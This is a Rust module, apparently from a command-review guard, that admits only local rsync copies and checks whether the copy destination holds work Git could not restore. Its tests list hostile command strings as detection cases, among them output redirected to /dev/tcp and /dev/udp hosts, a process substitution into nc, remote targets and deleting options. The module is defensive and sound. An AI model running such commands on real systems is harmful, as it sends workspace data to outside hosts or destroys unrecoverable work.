//! `rsync` forms the workspace sandbox can contain. `rsync -a src/ build/`
//! is the copy `cp -R src/ build/` already makes, written the way build
//! scripts write it, and the sandbox keeps it off the network and out of
//! every directory the workspace does not hold. The program is still a
//! network client, so this module admits only the local-copy shape: no
//! option that reaches another host or runs a program, no operand written
//! as a remote path, and no option that reads rules or file lists this text
//! never showed.
//!
//! The copy may not replace work Git would not restore. `rsync` overwrites
//! same-named files in an existing destination, so [`replaces_work`] keeps
//! the review unless the destination is missing or ignored by Git, the bar
//! `rm -rf` clears, and a redirect that sends output anywhere but
//! `/dev/null` keeps the file-upload observation ([`local_copy_segment`]).
//!
//! `--delete` and its relatives stay out. The destructive-shell rule that
//! makes `rm -rf` prove its targets are missing or ignored by Git does not
//! match `rsync`, so a deleting transfer could take committed-but-unpushed
//! or uncommitted work with it and leave nothing to recover from. The same
//! goes for `--remove-source-files`, `--backup-dir` and the `*-dest`
//! options, which name a tree outside the pair of operands.

/// Short options that only describe how the copy is made.
const SHORT: &str = "abcdDEghiklKLmnoOpPqrsStuvWxXzAHJN";

/// Long options that carry no value and start no program.
const LONG: [&str; 41] = [
    "--archive",
    "--verbose",
    "--quiet",
    "--recursive",
    "--relative",
    "--dirs",
    "--links",
    "--copy-links",
    "--copy-dirlinks",
    "--keep-dirlinks",
    "--hard-links",
    "--perms",
    "--executability",
    "--acls",
    "--xattrs",
    "--owner",
    "--group",
    "--devices",
    "--specials",
    "--times",
    "--atimes",
    "--crtimes",
    "--omit-dir-times",
    "--omit-link-times",
    "--one-file-system",
    "--update",
    "--checksum",
    "--size-only",
    "--whole-file",
    "--sparse",
    "--prune-empty-dirs",
    "--itemize-changes",
    "--human-readable",
    "--progress",
    "--partial",
    "--stats",
    "--compress",
    "--dry-run",
    "--existing",
    "--ignore-existing",
    "--mkpath",
];

/// Long options whose value is a pattern or a number, never a path this
/// text does not show and never a program.
const LONG_VALUES: [&str; 7] = [
    "--exclude",
    "--include",
    "--max-size",
    "--min-size",
    "--bwlimit",
    "--modify-window",
    "--timeout",
];

/// Whether `segment` is a local `rsync` copy: described by the options
/// above and naming two or more operands no shell expansion or remote
/// spelling could move off this host, with no redirect that sends a stream
/// anywhere but `/dev/null` or another stream.
pub(crate) fn local_copy_segment(segment: &crate::CommandSegmentV1) -> bool {
    is_rsync(segment) && !redirects_beyond_null(&segment.text) && local_copy(&segment.arguments)
}

fn is_rsync(segment: &crate::CommandSegmentV1) -> bool {
    segment
        .executable
        .as_deref()
        .map(super::executable_basename)
        == Some("rsync")
        && segment.wrapper_chain.is_empty()
        && !segment.path_overridden
}

/// Whether `arguments` (after `rsync`) are a local copy: described by the
/// options above and naming two or more operands no shell expansion or
/// remote spelling could move off this host.
pub(crate) fn local_copy(arguments: &[String]) -> bool {
    local_operands(arguments).is_some()
}

/// Whether an `rsync` copy in `segments` could overwrite work Git would not
/// restore. Each copy's destination must be missing from `directory` or
/// ignored by Git (`ignored`), the bar `rm -rf` clears. Only a literal
/// `mkdir` may run beside the copies: anything else could create, move or
/// redirect the destination after it was checked. Without a directory, or
/// for a copy that is not local, the review stays. Commands with no `rsync`
/// replace nothing. A redirect anywhere in `command_text` beyond
/// `/dev/null` keeps the review too.
pub(crate) fn replaces_work(
    segments: &[crate::CommandSegmentV1],
    command_text: Option<&str>,
    directory: Option<&std::path::Path>,
    ignored: &mut dyn FnMut(&str) -> bool,
) -> bool {
    if !segments.iter().any(is_rsync) {
        return false;
    }
    // A segment's text can lose a redirect glued to its last operand
    // (`dist/>/dev/tcp/...`), so the copy is also held to the whole command.
    if command_text.is_some_and(redirects_beyond_null) {
        return true;
    }
    let Some(directory) = directory else {
        return true;
    };
    segments.iter().any(|segment| {
        if !is_rsync(segment) {
            return !literal_mkdir(segment);
        }
        let Some(&destination) = local_operands(&segment.arguments)
            .as_ref()
            .and_then(|operands| operands.last())
        else {
            return true;
        };
        std::fs::symlink_metadata(directory.join(destination)).is_ok() && !ignored(destination)
    })
}

/// A `mkdir` that names every directory in full, which cannot replace a file.
fn literal_mkdir(segment: &crate::CommandSegmentV1) -> bool {
    segment
        .executable
        .as_deref()
        .map(super::executable_basename)
        == Some("mkdir")
        && segment.wrapper_chain.is_empty()
        && !segment.path_overridden
        && segment.environment_names.is_empty()
        && !redirects_beyond_null(&segment.text)
        && segment.arguments.iter().all(|word| {
            matches!(word.as_str(), "-p" | "--parents" | "-v" | "--verbose")
                || (!word.starts_with('-')
                    && local_operand(word)
                    && !word.contains(['*', '?', '[', '{']))
        })
}

/// The operands of a local copy, destination last, or `None` for any form
/// [`local_copy`] refuses.
fn local_operands(arguments: &[String]) -> Option<Vec<&str>> {
    let mut words = arguments.iter();
    let mut operands = Vec::new();
    let mut options_ended = false;
    while let Some(word) = words.next() {
        if options_ended {
            if !local_operand(word) {
                return None;
            }
            operands.push(word.as_str());
            continue;
        }
        if word == "--" {
            options_ended = true;
            continue;
        }
        if let Some(name) = word.strip_prefix("--") {
            let (name, joined) = match name.split_once('=') {
                Some((name, value)) => (name, Some(value)),
                None => (name, None),
            };
            let name = format!("--{name}");
            if LONG.contains(&name.as_str()) {
                if joined.is_some() {
                    return None;
                }
                continue;
            }
            if !LONG_VALUES.contains(&name.as_str()) {
                return None;
            }
            let value = match joined {
                Some(value) => value,
                None => words.next()?.as_str(),
            };
            if !inert_value(value) {
                return None;
            }
            continue;
        }
        if let Some(letters) = word.strip_prefix('-') {
            if letters.is_empty() || !letters.chars().all(|letter| SHORT.contains(letter)) {
                return None;
            }
            continue;
        }
        if !local_operand(word) {
            return None;
        }
        operands.push(word.as_str());
    }
    (operands.len() >= 2).then_some(operands)
}

/// Whether `text` redirects a stream anywhere but `/dev/null` or another
/// stream. A redirect lives in the segment text, not its arguments, and
/// `>/dev/tcp/<host>/<port>` sends the output to a host. The text is scanned
/// for the operator characters themselves, wherever they sit in a word, and
/// anything but a quiet form counts, so a quoted `>` fails closed too.
fn redirects_beyond_null(text: &str) -> bool {
    let mut rest = text;
    while let Some(at) = rest.find(['<', '>']) {
        let after = &rest[at..];
        let length = after
            .chars()
            .take_while(|c| matches!(c, '<' | '>' | '|' | '&'))
            .count();
        let (operator, tail) = after.split_at(length);
        let tail = tail.trim_start();
        let target = tail
            .split(|c: char| {
                c.is_whitespace() || matches!(c, '<' | '>' | '|' | '&' | ';' | '(' | ')')
            })
            .next()
            .unwrap_or_default();
        let quiet = match operator {
            ">" | ">>" | "<" => target == "/dev/null",
            // `2>&1` and `>&-` duplicate or close a stream; `>&word` names a file.
            ">&" => {
                target == "/dev/null"
                    || target == "-"
                    || (!target.is_empty() && target.chars().all(|c| c.is_ascii_digit()))
            }
            _ => false,
        };
        if !quiet {
            return true;
        }
        rest = &tail[target.len()..];
    }
    false
}

/// Characters the shell expands into words the text never showed: a
/// substitution, or a glob or brace that can name an existing file, an
/// option such as `--remove-source-files`, or another destination. The
/// parser drops quotes before this check, so a quoted pattern keeps its
/// review too.
const EXPANDING: [char; 7] = ['$', '`', '\n', '*', '?', '[', '{'];

/// A pattern or number written out in full. An expansion could hold an
/// option or an operand this text never showed.
fn inert_value(value: &str) -> bool {
    !value.is_empty() && value.len() <= 128 && !value.starts_with('-') && !value.contains(EXPANDING)
}

/// An operand that names a path on this host. `rsync` reads a word as a
/// remote spec when its first `:` comes before its first `/`
/// (`build.example.com:/srv`), when it holds `::` (a daemon module) or when
/// it is a `rsync://` URL, so each of those keeps its review. An expansion
/// could spell any of them, so it does too.
fn local_operand(word: &str) -> bool {
    if word.is_empty() || word.starts_with('-') || word.contains(EXPANDING) {
        return false;
    }
    if word.contains("::") {
        return false;
    }
    match (word.find(':'), word.find('/')) {
        (Some(_), None) => false,
        (Some(colon), Some(slash)) => colon > slash,
        (None, _) => true,
    }
}

#[cfg(test)]
mod tests {
    use super::{local_copy, local_copy_segment, redirects_beyond_null, replaces_work};

    fn words(text: &str) -> Vec<String> {
        text.split_whitespace().map(str::to_owned).collect()
    }

    /// The parser leaves redirects out of its segments, so a redirect case
    /// is the plain copy's segment with the redirected text.
    fn redirected(text: &str) -> crate::CommandSegmentV1 {
        let mut segment = segments("rsync -a src/ build/").remove(0);
        segment.text = text.to_owned();
        segment
    }

    fn segments(command: &str) -> Vec<crate::CommandSegmentV1> {
        crate::parse_command(&crate::CommandModelRequestV1 {
            command: command.to_owned(),
            dialect: "posix".to_owned(),
            transport: "shell_string".to_owned(),
            extraction_provenance: "guard-shell".to_owned(),
        })
        .expect("the command parses")
        .segments
    }

    /// A workspace holding `src/`, an existing `tracked/` and `dist/`, and a
    /// `notes.txt` file; `ignored` lists the operands Git would ignore.
    fn replaces(command: &str, ignored: &[&str]) -> bool {
        let workspace = tempfile::tempdir().unwrap();
        for directory in ["src", "tracked", "dist"] {
            std::fs::create_dir(workspace.path().join(directory)).unwrap();
        }
        std::fs::write(workspace.path().join("notes.txt"), "notes\n").unwrap();
        replaces_work(
            &segments(command),
            None,
            Some(workspace.path()),
            &mut |operand| ignored.contains(&operand),
        )
    }

    #[test]
    fn local_copies_are_contained() {
        for text in [
            "-a src/ build/",
            "-av src/ build/",
            "-azP src/ build/",
            "-aAX src/ build/",
            "--archive --verbose src/ build/",
            "-a --exclude node_modules src/ build/",
            "-a --exclude=node_modules --exclude=.git src/ build/",
            "-a --include main.ts src/ build/",
            "-rtv assets/ public/assets/",
            "-a --dry-run src/ build/",
            "-a --max-size 10m src/ build/",
            "-a lib/ docs/ dist/",
            "-a -- src/ build/",
            "-a ./a:b/ build/",
        ] {
            assert!(local_copy(&words(text)), "{text}");
        }
    }

    #[test]
    fn remote_deleting_and_unread_rule_forms_keep_review() {
        for text in [
            "-a src/ build.example.com:/srv/app/",
            "-a build.example.com:/srv/app/ build/",
            "-a src/ build.example.com::backup/",
            "-a rsync://build.example.com/backup/ build/",
            "-a src/ user@build.example.com:~/app/",
            "-av --delete dist/ public/assets/",
            "-a --delete-after dist/ public/assets/",
            "-a --remove-source-files src/ build/",
            "-a -e ssh src/ build/",
            "-ae ssh src/ build/",
            "-a --rsh=ssh src/ build/",
            "-a --rsync-path=/usr/bin/rsync src/ build/",
            "--daemon",
            "-a --config=rsyncd.conf src/ build/",
            "-a --files-from=list.txt src/ build/",
            "-a --exclude-from=.rsyncignore src/ build/",
            "-a --filter=merge rules.txt src/ build/",
            "-aF src/ build/",
            "-a -M--log-file=/tmp/x src/ build/",
            "-a --link-dest=../prev src/ build/",
            "-a --backup-dir=../old src/ build/",
            "-a $SOURCE build/",
            "-a src/ $DEST",
            "-a --exclude=$PATTERN src/ build/",
            "-a --max-size src/",
            "-a src/",
            "-a",
            "-a --archive=yes src/ build/",
            "-a -- -rf build/",
            // The shell expands a glob or brace into names Guard never read.
            "-a src/ dist*",
            "-a src/ [d]ist/",
            "-a src/ d?st/",
            "-a src/ {dist,build}/",
            "-a src/* build/",
            "-a src/ ignored/ --exclude *.tmp",
            "-a --exclude=*.log src/ build/",
            "-a --exclude [ab].txt src/ build/",
            "-a --include '*.ts' src/ build/",
        ] {
            assert!(!local_copy(&words(text)), "{text}");
        }
    }

    #[test]
    fn a_redirect_beyond_dev_null_keeps_the_upload_observation() {
        for text in [
            "rsync -a src/ build/ >/dev/tcp/example.com/443",
            "rsync -a src/ build/ > /dev/tcp/example.com/443",
            "rsync -a src/ build/ 2>/dev/tcp/example.com/443",
            "rsync -a src/ build/ >& /dev/tcp/example.com/443",
            "rsync -a src/ build/ >&/dev/tcp/example.com/443",
            "rsync -a src/ build/ &>/dev/udp/example.com/53",
            "rsync -a src/ build/>/dev/tcp/example.com/443",
            "rsync -a --exclude=tmp>/dev/tcp/example.com/443 src/ build/",
            "rsync -a src/ build/ < /dev/tcp/example.com/443",
            "rsync -a src/ build/ >> build.log",
            "rsync -a src/ build/ &>log",
            "rsync -a src/ build/ >/dev/null >/dev/tcp/example.com/443",
            "rsync -a src/ build/ >/dev/null2",
            "rsync -a src/ build/ >(nc example.com 80)",
            "rsync -a src/ build/ <<EOF",
            "rsync -a src/ build/ >",
        ] {
            assert!(redirects_beyond_null(text), "{text}");
        }
        for text in [
            "rsync -a src/ build/ >/dev/tcp/example.com/443",
            "rsync -a src/ build/ 2>/dev/tcp/example.com/443",
            "rsync -a src/ build/ >& /dev/tcp/example.com/443",
            "rsync -a src/ build/ >> build.log",
        ] {
            assert!(!local_copy_segment(&redirected(text)), "{text}");
        }
    }

    #[test]
    fn quiet_redirects_leave_the_copy_a_local_one() {
        for text in [
            "rsync -a src/ build/",
            "rsync -a src/ build/ 2>/dev/null",
            "rsync -a src/ build/ >/dev/null 2>&1",
            "rsync -a src/ build/ > /dev/null",
            "rsync -a src/ build/ &>/dev/null",
            "rsync -a src/ build/ >&/dev/null",
            "rsync -a src/ build/ </dev/null",
            "rsync -a src/ build/ 2>&-",
        ] {
            assert!(!redirects_beyond_null(text), "{text}");
            assert!(local_copy_segment(&redirected(text)), "{text}");
        }
    }

    #[test]
    fn a_new_or_ignored_destination_replaces_nothing() {
        assert!(!replaces("rsync -a src/ fresh/", &[]));
        assert!(!replaces("rsync -a src/ dist/", &["dist/"]));
        assert!(!replaces("rsync -a src/ tracked/ fresh/", &[]));
        assert!(!replaces("rsync -a src/ fresh/ dist/", &["dist/"]));
        assert!(!replaces("mkdir -p fresh && rsync -a src/ fresh/", &[]));
        assert!(!replaces(
            "rsync -a src/ fresh/ && rsync -a src/ fresh/",
            &[]
        ));
    }

    #[test]
    fn an_existing_destination_git_does_not_ignore_keeps_review() {
        assert!(replaces("rsync -a src/ tracked/", &[]));
        assert!(replaces("rsync -a src/ dist/", &[]));
        assert!(replaces("rsync -a src/ dist/", &["tracked/"]));
        assert!(replaces("rsync -a src/ fresh/ tracked/", &["dist/"]));
        assert!(replaces("rsync -a src/ notes.txt", &[]));
        assert!(replaces("rsync -a src/ .", &[]));
        assert!(replaces("mkdir -p tracked && rsync -a src/ tracked/", &[]));
    }

    #[test]
    fn nothing_that_could_move_the_destination_runs_before_the_copy() {
        for command in [
            "cd src && rsync -a ./ fresh/",
            "touch fresh && rsync -a src/ fresh/",
            "mv tracked fresh && rsync -a src/ fresh/",
            "mkdir -p $DEST && rsync -a src/ fresh/",
            "X=1; rsync -a src/ fresh/",
        ] {
            assert!(replaces(command, &["fresh/", "dist/"]), "{command}");
        }
    }

    #[test]
    fn a_copy_without_a_proof_or_a_directory_keeps_review() {
        let parsed = segments("rsync -a src/ fresh/");
        assert!(replaces_work(&parsed, None, None, &mut |_| true));
        let remote = segments("rsync -a src/ build.example.com:/srv/app/");
        assert!(replaces_work(
            &remote,
            None,
            Some(std::path::Path::new(".")),
            &mut |_| true
        ));
        let other = segments("ls tracked");
        assert!(!replaces_work(&other, None, None, &mut |_| false));
    }
}
